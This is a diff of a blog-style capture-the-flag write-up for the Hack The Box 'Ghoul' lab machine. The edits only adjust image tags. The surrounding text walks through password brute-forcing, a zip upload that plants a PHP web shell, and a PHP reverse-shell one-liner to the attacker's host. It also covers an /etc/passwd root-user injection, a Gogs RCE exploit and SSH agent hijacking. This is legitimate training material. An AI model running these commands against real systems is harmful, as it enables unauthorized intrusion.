@@ -85,7 +85,7 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br>Hey guys, today Ghoul retired and here’s my write-up about it. It was a very hard box with a lot of rabbit holes, tons of enumeration and a lot of pivoting. However I enjoyed most parts of the box and learned some new stuff. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.101</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ghoul.htb</code>. Let’s jump right in !
-<img src="/images/hackthebox/ghoul/0.png" alt="">
+<img src="/images/hackthebox/ghoul/0.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -126,7 +126,7 @@ Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds
 
 <h2 id="initial-web-enumeration">Initial Web Enumeration</h2>
 <p><br>By going to <code class="highlighter-rouge">http://ghoul.htb</code> we see a basic static website with nothing really interesting :<br>
-<img src="/images/hackthebox/ghoul/1.png" alt="">
+<img src="/images/hackthebox/ghoul/1.png" alt=""><br>
 <br>So I ran <code class="highlighter-rouge">gobuster</code> with the extensions <code class="highlighter-rouge">php</code> and <code class="highlighter-rouge">html</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# gobuster -u http://ghoul.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,html
 
@@ -167,10 +167,10 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 </code></pre></div></div>
 <p><br><code class="highlighter-rouge">/secret.php</code> and <code class="highlighter-rouge">/users</code> look interesting.
 <br><code class="highlighter-rouge">/secret.php</code> :<br>
-<img src="/images/hackthebox/ghoul/2.png" alt="">
+<img src="/images/hackthebox/ghoul/2.png" alt=""><br>
 <br>Of course this user flag was just a troll, but there are two interesting things here, first one is <code class="highlighter-rouge">Noro</code> asking <code class="highlighter-rouge">Kaneki</code> for access and <code class="highlighter-rouge">Kaneki</code> replying with <code class="highlighter-rouge">ILoveTouka</code> which looks like a password. The other thing is the fake art site <code class="highlighter-rouge">Kaneki</code> talked about which is probably the site running on port 8080.
 <br><code class="highlighter-rouge">/users</code> :<br>
-<img src="/images/hackthebox/ghoul/3.png" alt="">
+<img src="/images/hackthebox/ghoul/3.png" alt=""><br>
 <br><code class="highlighter-rouge">ILoveTouka</code> didn’t work as a password so I tried to bruteforce the password with the username <code class="highlighter-rouge">admin</code> and I got it (<code class="highlighter-rouge">abcdef</code>) :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# wfuzz --hh 1073 -c -u http://ghoul.htb/users/login.php -X POST -d "Username=admin&amp;Password=FUZZ&amp;Submit=Login" -w ./darkweb2017-top10000.txt 
 
@@ -192,19 +192,15 @@ ID   Response   Lines      Word         Chars          Payload
 Finishing pending requests...
 </code></pre></div></div>
 <p><br>However this was just another troll :<br>
-<img src="/images/hackthebox/ghoul/4.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/ghoul/5.png" alt="">
+<img src="/images/hackthebox/ghoul/4.png" alt=""><br>
+<img src="/images/hackthebox/ghoul/5.png" alt=""><br>
 <br>I couldn’t find anything else on port 80 so I checked port 8080. It had basic <code class="highlighter-rouge">http</code> authentication :<br>
-<img src="/images/hackthebox/ghoul/6.png" alt="">
+<img src="/images/hackthebox/ghoul/6.png" alt=""><br>
 <br>But it was easily guessable, <code class="highlighter-rouge">admin : admin</code> :<br>
-<img src="/images/hackthebox/ghoul/7.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/ghoul/8.png" alt="">
+<img src="/images/hackthebox/ghoul/7.png" alt=""><br>
+<img src="/images/hackthebox/ghoul/8.png" alt=""><br>
 <br>This is the fake art website <code class="highlighter-rouge">Kaneki</code> was talking about, and we can upload images. But we can also upload <code class="highlighter-rouge">zip</code> archives :<br>
-<img src="/images/hackthebox/ghoul/9.png" alt="">
+<img src="/images/hackthebox/ghoul/9.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -221,22 +217,18 @@ root@kali:~/Desktop/HTB/boxes/ghoul# mv /var/www/html/shell.zip .
 root@kali:~/Desktop/HTB/boxes/ghoul# 
 </code></pre></div></div>
 <p><br>This is the easiest way to do it, let’s look at the file with <code class="highlighter-rouge">vi</code>, you’ll see the file name : <br>
-<img src="/images/hackthebox/ghoul/10.png" alt="">
+<img src="/images/hackthebox/ghoul/10.png" alt=""><br>
 <br>When this <code class="highlighter-rouge">zip</code> is extracted on the machine it will put <code class="highlighter-rouge">shell.php</code> in <code class="highlighter-rouge">/var/www/html</code>. 
 <br>
-<img src="/images/hackthebox/ghoul/11.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/ghoul/12.png" alt="">
+<img src="/images/hackthebox/ghoul/11.png" alt=""><br>
+<img src="/images/hackthebox/ghoul/12.png" alt=""><br>
 <br>The shell was successfully uploaded :<br>
-<img src="/images/hackthebox/ghoul/13.png" alt="">
+<img src="/images/hackthebox/ghoul/13.png" alt=""><br>
 <br>Now we can simply get a reverse shell, the usual <code class="highlighter-rouge">nc</code> shell didn’t work because <code class="highlighter-rouge">nc</code> wasn’t installed on the box so I used <code class="highlighter-rouge">php</code> instead :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.10.xx.xx",1337);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
 </code></pre></div></div>
-<p><img src="/images/hackthebox/ghoul/14.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/ghoul/15.png" alt="">
+<p><img src="/images/hackthebox/ghoul/14.png" alt=""><br>
+<img src="/images/hackthebox/ghoul/15.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -378,7 +370,7 @@ root@kali:~/Desktop/HTB/boxes/ghoul# mv /etc/passwd.1 /etc/passwd
 root@kali:~/Desktop/HTB/boxes/ghoul# 
 </code></pre></div></div>
 <p><br>Then I uploaded it :<br>
-<img src="/images/hackthebox/ghoul/16.png" alt="">
+<img src="/images/hackthebox/ghoul/16.png" alt=""><br>
 <br>Now we can do <code class="highlighter-rouge">su rooot</code> and use <code class="highlighter-rouge">AAAA</code> as a password :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/www/html$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -415,7 +407,7 @@ uid=0(root) gid=0(root) groups=0(root)
 root@Aogiri:/var/www/html# 
 </code></pre></div></div>
 <p><br>And I could get the user flag from <code class="highlighter-rouge">/home/kaneki</code> :<br>
-<img src="/images/hackthebox/ghoul/17.png" alt="">
+<img src="/images/hackthebox/ghoul/17.png" alt=""><br>
 <br>We owned user.
 <br></p>
 <hr>
@@ -674,7 +666,7 @@ v+EB7xAmWe1q9xSgLSq6I1fWJrYqjkOd9TpqVPNoyTGWM1ELYXyHah8vZi+0BFzh
 -----END RSA PRIVATE KEY-----
 </code></pre></div></div>
 <p><br>I tried to crack the key but I couldn’t find the password in <code class="highlighter-rouge">rockyou</code>. Then I remembered <code class="highlighter-rouge">/secret.php</code> when <code class="highlighter-rouge">Noro</code> asked <code class="highlighter-rouge">Kaneki</code> for access and <code class="highlighter-rouge">Kaneki</code> replied with a weird string that looked like a password (<code class="highlighter-rouge">ILoveTouka</code>) :
-<img src="/images/hackthebox/ghoul/2.png" alt="">
+<img src="/images/hackthebox/ghoul/2.png" alt=""><br>
 <br>I tried that as the key password and it worked :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# nano kaneki.key
 root@kali:~/Desktop/HTB/boxes/ghoul# chmod 600 kaneki.key 
@@ -684,7 +676,7 @@ Last login: Fri Oct  4 11:40:26 2019 from 10.10.15.168
 kaneki@Aogiri:~$ 
 </code></pre></div></div>
 <p><br>Since I’m going to tunnel stuff I echoed my public key to <code class="highlighter-rouge">/root/.ssh/authorized_keys</code> and I got ssh as root :<br>
-<img src="/images/hackthebox/ghoul/18.png" alt="">
+<img src="/images/hackthebox/ghoul/18.png" alt=""><br>
 <br>I forwarded port 22 on <code class="highlighter-rouge">172.20.0.150</code> then I sshed to the box as <code class="highlighter-rouge">kaneki_pub</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# ssh -i id_rsa -L 2020:172.20.0.150:22 root@ghoul.htb 
 Last login: Fri Oct  4 13:13:00 2019 from 10.10.xx.xx
@@ -789,12 +781,10 @@ Enter passphrase for key 'kaneki.key':
 Last login: Fri Oct  4 13:42:14 2019 from 10.10.15.168
 kaneki@Aogiri:~$ 
 </code></pre></div></div>
-<p><img src="/images/hackthebox/ghoul/19.png" alt="">
+<p><img src="/images/hackthebox/ghoul/19.png" alt=""><br>
 <br>We already have the username : <code class="highlighter-rouge">AogiriTest</code>. I tried the password I got from <code class="highlighter-rouge">tomcat-users.xml</code> (<code class="highlighter-rouge">test@aogiri123</code>) and it worked :
-<img src="/images/hackthebox/ghoul/20.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/ghoul/21.png" alt="">
+<img src="/images/hackthebox/ghoul/20.png" alt=""><br>
+<img src="/images/hackthebox/ghoul/21.png" alt=""><br>
 <br>The hint said that this version of <code class="highlighter-rouge">gogs</code> was vulnerable, so I cloned <a href="https://github.com/TheZ3ro/gogsownz" target="_blank" rel="noopener noreferrer">gogsownz</a> and tried to exploit the <code class="highlighter-rouge">RCE</code> vulnerability :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# git clone https://github.com/TheZ3ro/gogsownz.git
 Cloning into 'gogsownz'...
@@ -845,7 +835,7 @@ Serving HTTP on 0.0.0.0 port 80 ...
 10.10.10.101 - - [04/Oct/2019 16:41:19] "GET / HTTP/1.1" 200 -
 </code></pre></div></div>
 <p><br>It worked, time to get a reverse shell :
-<img src="/images/hackthebox/ghoul/22.png" alt="">
+<img src="/images/hackthebox/ghoul/22.png" alt=""><br>
 <br></p>
 <hr>
 
@@ -1139,7 +1129,7 @@ root@kaneki-pc:/tmp# ssh-add -l
 2048 SHA256:U3NCrv1R4fOSeyIk3W0EcaAm81ETo4dcu5+FBbk3KxE /home/kaneki/.ssh/id_rsa (RSA)
 </code></pre></div></div>
 <p><br>Then I could <code class="highlighter-rouge">ssh</code> to <code class="highlighter-rouge">172.18.0.1</code> as root :
-<img src="/images/hackthebox/ghoul/23.png" alt="">
+<img src="/images/hackthebox/ghoul/23.png" alt=""><br>
 <br>
 <br>And we owned root !
 <br>That’s it , Feedback is appreciated !
